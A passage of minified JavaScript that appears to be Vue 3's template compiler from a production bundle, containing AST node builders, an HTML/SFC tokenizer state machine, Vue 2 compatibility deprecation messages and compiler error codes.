        1: "CAN_SKIP_PATCH",
        CAN_CACHE: 2,
        2: "CAN_CACHE",
        CAN_STRINGIFY: 3,
        3: "CAN_STRINGIFY"
    },
    $e = {
        start: {
            line: 1,
            column: 1,
            offset: 0
        },
        end: {
            line: 1,
            column: 1,
            offset: 0
        },
        source: ""
    };

function lm(e, t = "") {
    return {
        type: 0,
        source: t,
        children: e,
        helpers: new Set,
        components: [],
        directives: [],
        hoists: [],
        imports: [],
        cached: [],
        temps: 0,
        codegenNode: void 0,
        loc: $e
    }
}

function Gs(e, t, n, r, s, i, o, a = !1, c = !1, u = !1, l = $e) {
    return e && (a ? (e.helper(wr), e.helper(rs(e.inSSR, u))) : e.helper(ns(e.inSSR, u)), o && e.helper(Yc)), {
        type: 13,
        tag: t,
        props: n,
        children: r,
        patchFlag: s,
        dynamicProps: i,
        directives: o,
        isBlock: a,
        disableTracking: c,
        isComponent: u,
        loc: l
    }
}

function br(e, t = $e) {
    return {
        type: 17,
        loc: t,
        elements: e
    }
}

function Rt(e, t = $e) {
    return {
        type: 15,
        loc: t,
        properties: e
    }
}

function Oe(e, t) {
    return {
        type: 16,
        loc: $e,
        key: re(e) ? oe(e, !0) : e,
        value: t
    }
}

function oe(e, t = !1, n = $e, r = 0) {
    return {
        type: 4,
        loc: n,
        content: e,
        isStatic: t,
        constType: t ? 3 : r
    }
}

function Jw(e, t) {
    return {
        type: 5,
        loc: t,
        content: re(e) ? oe(e, !1, t) : e
    }
}

function Ht(e, t = $e) {
    return {
        type: 8,
        loc: t,
        children: e
    }
}

function Me(e, t = [], n = $e) {
    return {
        type: 14,
        loc: n,
        callee: e,
        arguments: t
    }
}

function ts(e, t = void 0, n = !1, r = !1, s = $e) {
    return {
        type: 18,
        params: e,
        returns: t,
        newline: n,
        isSlot: r,
        loc: s
    }
}

function sc(e, t, n, r = !0) {
    return {
        type: 19,
        test: e,
        consequent: t,
        alternate: n,
        newline: r,
        loc: $e
    }
}

function um(e, t, n = !1, r = !1) {
    return {
        type: 20,
        index: e,
        value: t,
        needPauseTracking: n,
        inVOnce: r,
        needArraySpread: !1,
        loc: $e
    }
}

function fm(e) {
    return {
        type: 21,
        body: e,
        loc: $e
    }
}

function Qw(e) {
    return {
        type: 22,
        elements: e,
        loc: $e
    }
}

function e_(e, t, n) {
    return {
        type: 23,
        test: e,
        consequent: t,
        alternate: n,
        loc: $e
    }
}

function t_(e, t) {
    return {
        type: 24,
        left: e,
        right: t,
        loc: $e
    }
}

function n_(e) {
    return {
        type: 25,
        expressions: e,
        loc: $e
    }
}

function r_(e) {
    return {
        type: 26,
        returns: e,
        loc: $e
    }
}

function ns(e, t) {
    return e || t ? zc : qc
}

function rs(e, t) {
    return e || t ? tf : nf
}

function sl(e, {
    helper: t,
    removeHelper: n,
    inSSR: r
}) {
    e.isBlock || (e.isBlock = !0, n(ns(r, e.isComponent)), t(wr), t(rs(r, e.isComponent)))
}
const bh = new Uint8Array([123, 123]),
    gh = new Uint8Array([125, 125]);

function xh(e) {
    return e >= 97 && e <= 122 || e >= 65 && e <= 90
}

function Pt(e) {
    return e === 32 || e === 10 || e === 9 || e === 12 || e === 13
}

function sr(e) {
    return e === 47 || e === 62 || Pt(e)
}

function ic(e) {
    const t = new Uint8Array(e.length);
    for (let n = 0; n < e.length; n++) t[n] = e.charCodeAt(n);
    return t
}
const Ye = {
    Cdata: new Uint8Array([67, 68, 65, 84, 65, 91]),
    CdataEnd: new Uint8Array([93, 93, 62]),
    CommentEnd: new Uint8Array([45, 45, 62]),
    ScriptEnd: new Uint8Array([60, 47, 115, 99, 114, 105, 112, 116]),
    StyleEnd: new Uint8Array([60, 47, 115, 116, 121, 108, 101]),
    TitleEnd: new Uint8Array([60, 47, 116, 105, 116, 108, 101]),
    TextareaEnd: new Uint8Array([60, 47, 116, 101, 120, 116, 97, 114, 101, 97])
};
class s_ {
    constructor(t, n) {
        this.stack = t, this.cbs = n, this.state = 1, this.buffer = "", this.sectionStart = 0, this.index = 0, this.entityStart = 0, this.baseState = 1, this.inRCDATA = !1, this.inXML = !1, this.inVPre = !1, this.newlines = [], this.mode = 0, this.delimiterOpen = bh, this.delimiterClose = gh, this.delimiterIndex = -1, this.currentSequence = void 0, this.sequenceIndex = 0
    }
    get inSFCRoot() {
        return this.mode === 2 && this.stack.length === 0
    }
    reset() {
        this.state = 1, this.mode = 0, this.buffer = "", this.sectionStart = 0, this.index = 0, this.baseState = 1, this.inRCDATA = !1, this.currentSequence = void 0, this.newlines.length = 0, this.delimiterOpen = bh, this.delimiterClose = gh
    }
    getPos(t) {
        let n = 1,
            r = t + 1;
        for (let s = this.newlines.length - 1; s >= 0; s--) {
            const i = this.newlines[s];
            if (t > i) {
                n = s + 2, r = t - i;
                break
            }
        }
        return {
            column: r,
            line: n,
            offset: t
        }
    }
    peek() {
        return this.buffer.charCodeAt(this.index + 1)
    }
    stateText(t) {
        t === 60 ? (this.index > this.sectionStart && this.cbs.ontext(this.sectionStart, this.index), this.state = 5, this.sectionStart = this.index) : !this.inVPre && t === this.delimiterOpen[0] && (this.state = 2, this.delimiterIndex = 0, this.stateInterpolationOpen(t))
    }
    stateInterpolationOpen(t) {
        if (t === this.delimiterOpen[this.delimiterIndex])
            if (this.delimiterIndex === this.delimiterOpen.length - 1) {
                const n = this.index + 1 - this.delimiterOpen.length;
                n > this.sectionStart && this.cbs.ontext(this.sectionStart, n), this.state = 3, this.sectionStart = n
            } else this.delimiterIndex++;
        else this.inRCDATA ? (this.state = 32, this.stateInRCDATA(t)) : (this.state = 1, this.stateText(t))
    }
    stateInterpolation(t) {
        t === this.delimiterClose[0] && (this.state = 4, this.delimiterIndex = 0, this.stateInterpolationClose(t))
    }
    stateInterpolationClose(t) {
        t === this.delimiterClose[this.delimiterIndex] ? this.delimiterIndex === this.delimiterClose.length - 1 ? (this.cbs.oninterpolation(this.sectionStart, this.index + 1), this.inRCDATA ? this.state = 32 : this.state = 1, this.sectionStart = this.index + 1) : this.delimiterIndex++ : (this.state = 3, this.stateInterpolation(t))
    }
    stateSpecialStartSequence(t) {
        const n = this.sequenceIndex === this.currentSequence.length;
        if (!(n ? sr(t) : (t | 32) === this.currentSequence[this.sequenceIndex])) this.inRCDATA = !1;
        else if (!n) {
            this.sequenceIndex++;
            return
        }
        this.sequenceIndex = 0, this.state = 6, this.stateInTagName(t)
    }
    stateInRCDATA(t) {
        if (this.sequenceIndex === this.currentSequence.length) {
            if (t === 62 || Pt(t)) {
                const n = this.index - this.currentSequence.length;
                if (this.sectionStart < n) {
                    const r = this.index;
                    this.index = n, this.cbs.ontext(this.sectionStart, n), this.index = r
                }
                this.sectionStart = n + 2, this.stateInClosingTagName(t), this.inRCDATA = !1;
                return
            }
            this.sequenceIndex = 0
        }(t | 32) === this.currentSequence[this.sequenceIndex] ? this.sequenceIndex += 1 : this.sequenceIndex === 0 ? this.currentSequence === Ye.TitleEnd || this.currentSequence === Ye.TextareaEnd && !this.inSFCRoot ? !this.inVPre && t === this.delimiterOpen[0] && (this.state = 2, this.delimiterIndex = 0, this.stateInterpolationOpen(t)) : this.fastForwardTo(60) && (this.sequenceIndex = 1) : this.sequenceIndex = +(t === 60)
    }
    stateCDATASequence(t) {
        t === Ye.Cdata[this.sequenceIndex] ? ++this.sequenceIndex === Ye.Cdata.length && (this.state = 28, this.currentSequence = Ye.CdataEnd, this.sequenceIndex = 0, this.sectionStart = this.index + 1) : (this.sequenceIndex = 0, this.state = 23, this.stateInDeclaration(t))
    }
    fastForwardTo(t) {
        for (; ++this.index < this.buffer.length;) {
            const n = this.buffer.charCodeAt(this.index);
            if (n === 10 && this.newlines.push(this.index), n === t) return !0
        }
        return this.index = this.buffer.length - 1, !1
    }
    stateInCommentLike(t) {
        t === this.currentSequence[this.sequenceIndex] ? ++this.sequenceIndex === this.currentSequence.length && (this.currentSequence === Ye.CdataEnd ? this.cbs.oncdata(this.sectionStart, this.index - 2) : this.cbs.oncomment(this.sectionStart, this.index - 2), this.sequenceIndex = 0, this.sectionStart = this.index + 1, this.state = 1) : this.sequenceIndex === 0 ? this.fastForwardTo(this.currentSequence[0]) && (this.sequenceIndex = 1) : t !== this.currentSequence[this.sequenceIndex - 1] && (this.sequenceIndex = 0)
    }
    startSpecial(t, n) {
        this.enterRCDATA(t, n), this.state = 31
    }
    enterRCDATA(t, n) {
        this.inRCDATA = !0, this.currentSequence = t, this.sequenceIndex = n
    }
    stateBeforeTagName(t) {
        t === 33 ? (this.state = 22, this.sectionStart = this.index + 1) : t === 63 ? (this.state = 24, this.sectionStart = this.index + 1) : xh(t) ? (this.sectionStart = this.index, this.mode === 0 ? this.state = 6 : this.inSFCRoot ? this.state = 34 : this.inXML ? this.state = 6 : t === 116 ? this.state = 30 : this.state = t === 115 ? 29 : 6) : t === 47 ? this.state = 8 : (this.state = 1, this.stateText(t))
    }
    stateInTagName(t) {
        sr(t) && this.handleTagName(t)
    }
    stateInSFCRootTagName(t) {
        if (sr(t)) {
            const n = this.buffer.slice(this.sectionStart, this.index);
            n !== "template" && this.enterRCDATA(ic("</" + n), 0), this.handleTagName(t)
        }
    }
    handleTagName(t) {
        this.cbs.onopentagname(this.sectionStart, this.index), this.sectionStart = -1, this.state = 11, this.stateBeforeAttrName(t)
    }
    stateBeforeClosingTagName(t) {
        Pt(t) || (t === 62 ? (this.state = 1, this.sectionStart = this.index + 1) : (this.state = xh(t) ? 9 : 27, this.sectionStart = this.index))
    }
    stateInClosingTagName(t) {
        (t === 62 || Pt(t)) && (this.cbs.onclosetag(this.sectionStart, this.index), this.sectionStart = -1, this.state = 10, this.stateAfterClosingTagName(t))
    }
    stateAfterClosingTagName(t) {
        t === 62 && (this.state = 1, this.sectionStart = this.index + 1)
    }
    stateBeforeAttrName(t) {
        t === 62 ? (this.cbs.onopentagend(this.index), this.inRCDATA ? this.state = 32 : this.state = 1, this.sectionStart = this.index + 1) : t === 47 ? this.state = 7 : t === 60 && this.peek() === 47 ? (this.cbs.onopentagend(this.index), this.state = 5, this.sectionStart = this.index) : Pt(t) || this.handleAttrStart(t)
    }
    handleAttrStart(t) {
        t === 118 && this.peek() === 45 ? (this.state = 13, this.sectionStart = this.index) : t === 46 || t === 58 || t === 64 || t === 35 ? (this.cbs.ondirname(this.index, this.index + 1), this.state = 14, this.sectionStart = this.index + 1) : (this.state = 12, this.sectionStart = this.index)
    }
    stateInSelfClosingTag(t) {
        t === 62 ? (this.cbs.onselfclosingtag(this.index), this.state = 1, this.sectionStart = this.index + 1, this.inRCDATA = !1) : Pt(t) || (this.state = 11, this.stateBeforeAttrName(t))
    }
    stateInAttrName(t) {
        (t === 61 || sr(t)) && (this.cbs.onattribname(this.sectionStart, this.index), this.handleAttrNameEnd(t))
    }
    stateInDirName(t) {
        t === 61 || sr(t) ? (this.cbs.ondirname(this.sectionStart, this.index), this.handleAttrNameEnd(t)) : t === 58 ? (this.cbs.ondirname(this.sectionStart, this.index), this.state = 14, this.sectionStart = this.index + 1) : t === 46 && (this.cbs.ondirname(this.sectionStart, this.index), this.state = 16, this.sectionStart = this.index + 1)
    }
    stateInDirArg(t) {
        t === 61 || sr(t) ? (this.cbs.ondirarg(this.sectionStart, this.index), this.handleAttrNameEnd(t)) : t === 91 ? this.state = 15 : t === 46 && (this.cbs.ondirarg(this.sectionStart, this.index), this.state = 16, this.sectionStart = this.index + 1)
    }
    stateInDynamicDirArg(t) {
        t === 93 ? this.state = 14 : (t === 61 || sr(t)) && (this.cbs.ondirarg(this.sectionStart, this.index + 1), this.handleAttrNameEnd(t))
    }
    stateInDirModifier(t) {
        t === 61 || sr(t) ? (this.cbs.ondirmodifier(this.sectionStart, this.index), this.handleAttrNameEnd(t)) : t === 46 && (this.cbs.ondirmodifier(this.sectionStart, this.index), this.sectionStart = this.index + 1)
    }
    handleAttrNameEnd(t) {
        this.sectionStart = this.index, this.state = 17, this.cbs.onattribnameend(this.index), this.stateAfterAttrName(t)
    }
    stateAfterAttrName(t) {
        t === 61 ? this.state = 18 : t === 47 || t === 62 ? (this.cbs.onattribend(0, this.sectionStart), this.sectionStart = -1, this.state = 11, this.stateBeforeAttrName(t)) : Pt(t) || (this.cbs.onattribend(0, this.sectionStart), this.handleAttrStart(t))
    }
    stateBeforeAttrValue(t) {
        t === 34 ? (this.state = 19, this.sectionStart = this.index + 1) : t === 39 ? (this.state = 20, this.sectionStart = this.index + 1) : Pt(t) || (this.sectionStart = this.index, this.state = 21, this.stateInAttrValueNoQuotes(t))
    }
    handleInAttrValue(t, n) {
        (t === n || this.fastForwardTo(n)) && (this.cbs.onattribdata(this.sectionStart, this.index), this.sectionStart = -1, this.cbs.onattribend(n === 34 ? 3 : 2, this.index + 1), this.state = 11)
    }
    stateInAttrValueDoubleQuotes(t) {
        this.handleInAttrValue(t, 34)
    }
    stateInAttrValueSingleQuotes(t) {
        this.handleInAttrValue(t, 39)
    }
    stateInAttrValueNoQuotes(t) {
        Pt(t) || t === 62 ? (this.cbs.onattribdata(this.sectionStart, this.index), this.sectionStart = -1, this.cbs.onattribend(1, this.index), this.state = 11, this.stateBeforeAttrName(t)) : (t === 39 || t === 60 || t === 61 || t === 96) && this.cbs.onerr(18, this.index)
    }
    stateBeforeDeclaration(t) {
        t === 91 ? (this.state = 26, this.sequenceIndex = 0) : this.state = t === 45 ? 25 : 23
    }
    stateInDeclaration(t) {
        (t === 62 || this.fastForwardTo(62)) && (this.state = 1, this.sectionStart = this.index + 1)
    }
    stateInProcessingInstruction(t) {
        (t === 62 || this.fastForwardTo(62)) && (this.cbs.onprocessinginstruction(this.sectionStart, this.index), this.state = 1, this.sectionStart = this.index + 1)
    }
    stateBeforeComment(t) {
        t === 45 ? (this.state = 28, this.currentSequence = Ye.CommentEnd, this.sequenceIndex = 2, this.sectionStart = this.index + 1) : this.state = 23
    }
    stateInSpecialComment(t) {
        (t === 62 || this.fastForwardTo(62)) && (this.cbs.oncomment(this.sectionStart, this.index), this.state = 1, this.sectionStart = this.index + 1)
    }
    stateBeforeSpecialS(t) {
        t === Ye.ScriptEnd[3] ? this.startSpecial(Ye.ScriptEnd, 4) : t === Ye.StyleEnd[3] ? this.startSpecial(Ye.StyleEnd, 4) : (this.state = 6, this.stateInTagName(t))
    }
    stateBeforeSpecialT(t) {
        t === Ye.TitleEnd[3] ? this.startSpecial(Ye.TitleEnd, 4) : t === Ye.TextareaEnd[3] ? this.startSpecial(Ye.TextareaEnd, 4) : (this.state = 6, this.stateInTagName(t))
    }
    startEntity() {}
    stateInEntity() {}
    parse(t) {
        for (this.buffer = t; this.index < this.buffer.length;) {
            const n = this.buffer.charCodeAt(this.index);
            switch (n === 10 && this.state !== 33 && this.newlines.push(this.index), this.state) {
                case 1: {
                    this.stateText(n);
                    break
                }
                case 2: {
                    this.stateInterpolationOpen(n);
                    break
                }
                case 3: {
                    this.stateInterpolation(n);
                    break
                }
                case 4: {
                    this.stateInterpolationClose(n);
                    break
                }
                case 31: {
                    this.stateSpecialStartSequence(n);
                    break
                }
                case 32: {
                    this.stateInRCDATA(n);
                    break
                }
                case 26: {
                    this.stateCDATASequence(n);
                    break
                }
                case 19: {
                    this.stateInAttrValueDoubleQuotes(n);
                    break
                }
                case 12: {
                    this.stateInAttrName(n);
                    break
                }
                case 13: {
                    this.stateInDirName(n);
                    break
                }
                case 14: {
                    this.stateInDirArg(n);
                    break
                }
                case 15: {
                    this.stateInDynamicDirArg(n);
                    break
                }
                case 16: {
                    this.stateInDirModifier(n);
                    break
                }
                case 28: {
                    this.stateInCommentLike(n);
                    break
                }
                case 27: {
                    this.stateInSpecialComment(n);
                    break
                }
                case 11: {
                    this.stateBeforeAttrName(n);
                    break
                }
                case 6: {
                    this.stateInTagName(n);
                    break
                }
                case 34: {
                    this.stateInSFCRootTagName(n);
                    break
                }
                case 9: {
                    this.stateInClosingTagName(n);
                    break
                }
                case 5: {
                    this.stateBeforeTagName(n);
                    break
                }
                case 17: {
                    this.stateAfterAttrName(n);
                    break
                }
                case 20: {
                    this.stateInAttrValueSingleQuotes(n);
                    break
                }
                case 18: {
                    this.stateBeforeAttrValue(n);
                    break
                }
                case 8: {
                    this.stateBeforeClosingTagName(n);
                    break
                }
                case 10: {
                    this.stateAfterClosingTagName(n);
                    break
                }
                case 29: {
                    this.stateBeforeSpecialS(n);
                    break
                }
                case 30: {
                    this.stateBeforeSpecialT(n);
                    break
                }
                case 21: {
                    this.stateInAttrValueNoQuotes(n);
                    break
                }
                case 7: {
                    this.stateInSelfClosingTag(n);
                    break
                }
                case 23: {
                    this.stateInDeclaration(n);
                    break
                }
                case 22: {
                    this.stateBeforeDeclaration(n);
                    break
                }
                case 25: {
                    this.stateBeforeComment(n);
                    break
                }
                case 24: {
                    this.stateInProcessingInstruction(n);
                    break
                }
                case 33: {
                    this.stateInEntity();
                    break
                }
            }
            this.index++
        }
        this.cleanup(), this.finish()
    }
    cleanup() {
        this.sectionStart !== this.index && (this.state === 1 || this.state === 32 && this.sequenceIndex === 0 ? (this.cbs.ontext(this.sectionStart, this.index), this.sectionStart = this.index) : (this.state === 19 || this.state === 20 || this.state === 21) && (this.cbs.onattribdata(this.sectionStart, this.index), this.sectionStart = this.index))
    }
    finish() {
        this.handleTrailingData(), this.cbs.onend()
    }
    handleTrailingData() {
        const t = this.buffer.length;
        this.sectionStart >= t || (this.state === 28 ? this.currentSequence === Ye.CdataEnd ? this.cbs.oncdata(this.sectionStart, t) : this.cbs.oncomment(this.sectionStart, t) : this.state === 6 || this.state === 11 || this.state === 18 || this.state === 17 || this.state === 12 || this.state === 13 || this.state === 14 || this.state === 15 || this.state === 16 || this.state === 20 || this.state === 19 || this.state === 21 || this.state === 9 || this.cbs.ontext(this.sectionStart, t))
    }
    emitCodePoint(t, n) {}
}
const i_ = {
        COMPILER_IS_ON_ELEMENT: "COMPILER_IS_ON_ELEMENT",
        COMPILER_V_BIND_SYNC: "COMPILER_V_BIND_SYNC",
        COMPILER_V_BIND_OBJECT_ORDER: "COMPILER_V_BIND_OBJECT_ORDER",
        COMPILER_V_ON_NATIVE: "COMPILER_V_ON_NATIVE",
        COMPILER_V_IF_V_FOR_PRECEDENCE: "COMPILER_V_IF_V_FOR_PRECEDENCE",
        COMPILER_NATIVE_TEMPLATE: "COMPILER_NATIVE_TEMPLATE",
        COMPILER_INLINE_TEMPLATE: "COMPILER_INLINE_TEMPLATE",
        COMPILER_FILTERS: "COMPILER_FILTERS"
    },
    o_ = {
        COMPILER_IS_ON_ELEMENT: {
            message: 'Platform-native elements with "is" prop will no longer be treated as components in Vue 3 unless the "is" value is explicitly prefixed with "vue:".',
            link: "https://v3-migration.vuejs.org/breaking-changes/custom-elements-interop.html"
        },
        COMPILER_V_BIND_SYNC: {
            message: e => `.sync modifier for v-bind has been removed. Use v-model with argument instead. \`v-bind:${e}.sync\` should be changed to \`v-model:${e}\`.`,
            link: "https://v3-migration.vuejs.org/breaking-changes/v-model.html"
        },
        COMPILER_V_BIND_OBJECT_ORDER: {
            message: 'v-bind="obj" usage is now order sensitive and behaves like JavaScript object spread: it will now overwrite an existing non-mergeable attribute that appears before v-bind in the case of conflict. To retain 2.x behavior, move v-bind to make it the first attribute. You can also suppress this warning if the usage is intended.',
            link: "https://v3-migration.vuejs.org/breaking-changes/v-bind.html"
        },
        COMPILER_V_ON_NATIVE: {
            message: ".native modifier for v-on has been removed as is no longer necessary.",
            link: "https://v3-migration.vuejs.org/breaking-changes/v-on-native-modifier-removed.html"
        },
        COMPILER_V_IF_V_FOR_PRECEDENCE: {
            message: "v-if / v-for precedence when used on the same element has changed in Vue 3: v-if now takes higher precedence and will no longer have access to v-for scope variables. It is best to avoid the ambiguity with <template> tags or use a computed property that filters v-for data source.",
            link: "https://v3-migration.vuejs.org/breaking-changes/v-if-v-for.html"
        },
        COMPILER_NATIVE_TEMPLATE: {
            message: "<template> with no special directives will render as a native template element instead of its inner content in Vue 3."
        },
        COMPILER_INLINE_TEMPLATE: {
            message: '"inline-template" has been removed in Vue 3.',
            link: "https://v3-migration.vuejs.org/breaking-changes/inline-template-attribute.html"
        },
        COMPILER_FILTERS: {
            message: 'filters have been removed in Vue 3. The "|" symbol will be treated as native JavaScript bitwise OR operator. Use method calls or computed properties instead.',
            link: "https://v3-migration.vuejs.org/breaking-changes/filters.html"
        }
    };

function ku(e, {
    compatConfig: t
}) {
    const n = t && t[e];
    return e === "MODE" ? n || 3 : n
}

function Xr(e, t) {
    const n = ku("MODE", t),
        r = ku(e, t);
    return n === 3 ? r === !0 : r !== !1
}

function Ws(e, t, n, ...r) {
    return Xr(e, t)
}

function a_(e, t, n, ...r) {
    if (ku(e, t) === "suppress-warning") return;
    const {
        message: i,
        link: o
    } = o_[e], a = `(deprecation ${e}) ${typeof i=="function"?i(...r):i}${o?`
  Details: ${o}`:""}`, c = new SyntaxError(a);
    c.code = e, n && (c.loc = n), t.onWarn(c)
}

function cf(e) {
    throw e
}

function dm(e) {}

function Ee(e, t, n, r) {
    const s = `https://vuejs.org/error-reference/#compiler-${e}`,
        i = new SyntaxError(String(s));
    return i.code = e, i.loc = t, i
}
const c_ = {
        ABRUPT_CLOSING_OF_EMPTY_COMMENT: 0,
        0: "ABRUPT_CLOSING_OF_EMPTY_COMMENT",
        CDATA_IN_HTML_CONTENT: 1,
        1: "CDATA_IN_HTML_CONTENT",
        DUPLICATE_ATTRIBUTE: 2,
        2: "DUPLICATE_ATTRIBUTE",
        END_TAG_WITH_ATTRIBUTES: 3,
        3: "END_TAG_WITH_ATTRIBUTES",
        END_TAG_WITH_TRAILING_SOLIDUS: 4,
        4: "END_TAG_WITH_TRAILING_SOLIDUS",
        EOF_BEFORE_TAG_NAME: 5,
        5: "EOF_BEFORE_TAG_NAME",
        EOF_IN_CDATA: 6,
        6: "EOF_IN_CDATA",
        EOF_IN_COMMENT: 7,
        7: "EOF_IN_COMMENT",
        EOF_IN_SCRIPT_HTML_COMMENT_LIKE_TEXT: 8,
        8: "EOF_IN_SCRIPT_HTML_COMMENT_LIKE_TEXT",
        EOF_IN_TAG: 9,
        9: "EOF_IN_TAG",
        INCORRECTLY_CLOSED_COMMENT: 10,
        10: "INCORRECTLY_CLOSED_COMMENT",
        INCORRECTLY_OPENED_COMMENT: 11,
        11: "INCORRECTLY_OPENED_COMMENT",
        INVALID_FIRST_CHARACTER_OF_TAG_NAME: 12,
        12: "INVALID_FIRST_CHARACTER_OF_TAG_NAME",
        MISSING_ATTRIBUTE_VALUE: 13,
        13: "MISSING_ATTRIBUTE_VALUE",
        MISSING_END_TAG_NAME: 14,
        14: "MISSING_END_TAG_NAME",
        MISSING_WHITESPACE_BETWEEN_ATTRIBUTES: 15,
        15: "MISSING_WHITESPACE_BETWEEN_ATTRIBUTES",
        NESTED_COMMENT: 16,
        16: "NESTED_COMMENT",
        UNEXPECTED_CHARACTER_IN_ATTRIBUTE_NAME: 17,
        17: "UNEXPECTED_CHARACTER_IN_ATTRIBUTE_NAME",
        UNEXPECTED_CHARACTER_IN_UNQUOTED_ATTRIBUTE_VALUE: 18,
        18: "UNEXPECTED_CHARACTER_IN_UNQUOTED_ATTRIBUTE_VALUE",
        UNEXPECTED_EQUALS_SIGN_BEFORE_ATTRIBUTE_NAME: 19,
        19: "UNEXPECTED_EQUALS_SIGN_BEFORE_ATTRIBUTE_NAME",
        UNEXPECTED_NULL_CHARACTER: 20,
        20: "UNEXPECTED_NULL_CHARACTER",
        UNEXPECTED_QUESTION_MARK_INSTEAD_OF_TAG_NAME: 21,
        21: "UNEXPECTED_QUESTION_MARK_INSTEAD_OF_TAG_NAME",
        UNEXPECTED_SOLIDUS_IN_TAG: 22,
        22: "UNEXPECTED_SOLIDUS_IN_TAG",
        X_INVALID_END_TAG: 23,
        23: "X_INVALID_END_TAG",
        X_MISSING_END_TAG: 24,
        24: "X_MISSING_END_TAG",
        X_MISSING_INTERPOLATION_END: 25,
        25: "X_MISSING_INTERPOLATION_END",
        X_MISSING_DIRECTIVE_NAME: 26,
        26: "X_MISSING_DIRECTIVE_NAME",
        X_MISSING_DYNAMIC_DIRECTIVE_ARGUMENT_END: 27,
        27: "X_MISSING_DYNAMIC_DIRECTIVE_ARGUMENT_END",
        X_V_IF_NO_EXPRESSION: 28,
        28: "X_V_IF_NO_EXPRESSION",
        X_V_IF_SAME_KEY: 29,
        29: "X_V_IF_SAME_KEY",
        X_V_ELSE_NO_ADJACENT_IF: 30,
        30: "X_V_ELSE_NO_ADJACENT_IF",
        X_V_FOR_NO_EXPRESSION: 31,
        31: "X_V_FOR_NO_EXPRESSION",
        X_V_FOR_MALFORMED_EXPRESSION: 32,
        32: "X_V_FOR_MALFORMED_EXPRESSION",
        X_V_FOR_TEMPLATE_KEY_PLACEMENT: 33,
        33: "X_V_FOR_TEMPLATE_KEY_PLACEMENT",
        X_V_BIND_NO_EXPRESSION: 34,
        34: "X_V_BIND_NO_EXPRESSION",
        X_V_ON_NO_EXPRESSION: 35,
        35: "X_V_ON_NO_EXPRESSION",
        X_V_SLOT_UNEXPECTED_DIRECTIVE_ON_SLOT_OUTLET: 36,
        36: "X_V_SLOT_UNEXPECTED_DIRECTIVE_ON_SLOT_OUTLET",
        X_V_SLOT_MIXED_SLOT_USAGE: 37,
        37: "X_V_SLOT_MIXED_SLOT_USAGE",
        X_V_SLOT_DUPLICATE_SLOT_NAMES: 38,
        38: "X_V_SLOT_DUPLICATE_SLOT_NAMES",
        X_V_SLOT_EXTRANEOUS_DEFAULT_SLOT_CHILDREN: 39,
        39: "X_V_SLOT_EXTRANEOUS_DEFAULT_SLOT_CHILDREN",
        X_V_SLOT_MISPLACED: 40,
        40: "X_V_SLOT_MISPLACED",
        X_V_MODEL_NO_EXPRESSION: 41,
        41: "X_V_MODEL_NO_EXPRESSION",
        X_V_MODEL_MALFORMED_EXPRESSION: 42,
        42: "X_V_MODEL_MALFORMED_EXPRESSION",
        X_V_MODEL_ON_SCOPE_VARIABLE: 43,
        43: "X_V_MODEL_ON_SCOPE_VARIABLE",
        X_V_MODEL_ON_PROPS: 44,
        44: "X_V_MODEL_ON_PROPS",
        X_INVALID_EXPRESSION: 45,
        45: "X_INVALID_EXPRESSION",
        X_KEEP_ALIVE_INVALID_CHILDREN: 46,
        46: "X_KEEP_ALIVE_INVALID_CHILDREN",
        X_PREFIX_ID_NOT_SUPPORTED: 47,
        47: "X_PREFIX_ID_NOT_SUPPORTED",
        X_MODULE_MODE_NOT_SUPPORTED: 48,
        48: "X_MODULE_MODE_NOT_SUPPORTED",
        X_CACHE_HANDLER_NOT_SUPPORTED: 49,
        49: "X_CACHE_HANDLER_NOT_SUPPORTED",
        X_SCOPE_ID_NOT_SUPPORTED: 50,
        50: "X_SCOPE_ID_NOT_SUPPORTED",
        X_VNODE_HOOKS: 51,
        51: "X_VNODE_HOOKS",
        X_V_BIND_INVALID_SAME_NAME_ARGUMENT: 52,
        52: "X_V_BIND_INVALID_SAME_NAME_ARGUMENT",
        __EXTEND_POINT__: 53,
        53: "__EXTEND_POINT__"
    },
    l_ = {
        0: "Illegal comment.",
        1: "CDATA section is allowed only in XML context.",
        2: "Duplicate attribute.",
        3: "End tag cannot have attributes.",
        4: "Illegal '/' in tags.",
        5: "Unexpected EOF in tag.",
        6: "Unexpected EOF in CDATA section.",
        7: "Unexpected EOF in comment.",
        8: "Unexpected EOF in script.",
        9: "Unexpected EOF in tag.",
        10: "Incorrectly closed comment.",
        11: "Incorrectly opened comment.",
        12: "Illegal tag name. Use '&lt;' to print '<'.",
        13: "Attribute value was expected.",
        14: "End tag name was expected.",
        15: "Whitespace was expected.",
        16: "Unexpected '<!--' in comment.",
        17: `Attribute name cannot contain U+0022 ("), U+0027 ('), and U+003C (<).`,
        18: "Unquoted attribute value cannot contain U+0022 (\"), U+0027 ('), U+003C (<), U+003D (=), and U+0060 (`).",
        19: "Attribute name cannot start with '='.",
        21: "'<?' is allowed only in XML context.",
        20: "Unexpected null character.",
        22: "Illegal '/' in tags.",
        23: "Invalid end tag.",
        24: "Element is missing end tag.",
        25: "Interpolation end sign was not found.",
        27: "End bracket for dynamic directive argument was not found. Note that dynamic directive argument cannot contain spaces.",
        26: "Legal directive name was expected.",
        28: "v-if/v-else-if is missing expression.",
        29: "v-if/else branches must use unique keys.",
        30: "v-else/v-else-if has no adjacent v-if or v-else-if.",
        31: "v-for is missing expression.",
        32: "v-for has invalid expression.",
        33: "<template v-for> key should be placed on the <template> tag.",
        34: "v-bind is missing expression.",
        52: "v-bind with same-name shorthand only allows static argument.",
        35: "v-on is missing expression.",
        36: "Unexpected custom directive on <slot> outlet.",
        37: "Mixed v-slot usage on both the component and nested <template>. When there are multiple named slots, all slots should use <template> syntax to avoid scope ambiguity.",
        38: "Duplicate slot names found. ",
        39: "Extraneous children found when component already has explicitly named default slot. These children will be ignored.",
        40: "v-slot can only be used on components or <template> tags.",
        41: "v-model is missing expression.",
        42: "v-model value must be a valid JavaScript member expression.",
        43: "v-model cannot be used on v-for or v-slot scope variables because they are not writable.",
        44: `v-model cannot be used on a prop, because local prop bindings are not writable.
Use a v-bind binding combined with a v-on listener that emits update:x event instead.`,
        45: "Error parsing JavaScript expression: ",
        46: "<KeepAlive> expects exactly one child component.",
        51: "@vnode-* hooks in templates are no longer supported. Use the vue: prefix instead. For example, @vnode-mounted should be changed to @vue:mounted. @vnode-* hooks support has been removed in 3.4.",
        47: '"prefixIdentifiers" option is not supported in this build of compiler.',
        48: "ES module mode is not supported in this build of compiler.",
        49: '"cacheHandlers" option is only supported when the "prefixIdentifiers" option is enabled.',
        50: '"scopeId" option is only supported in module mode.',
        53: ""
    };

function u_(e, t, n = !1, r = [], s = Object.create(null)) {}

function f_(e, t, n) {
    return !1
}

function d_(e, t) {
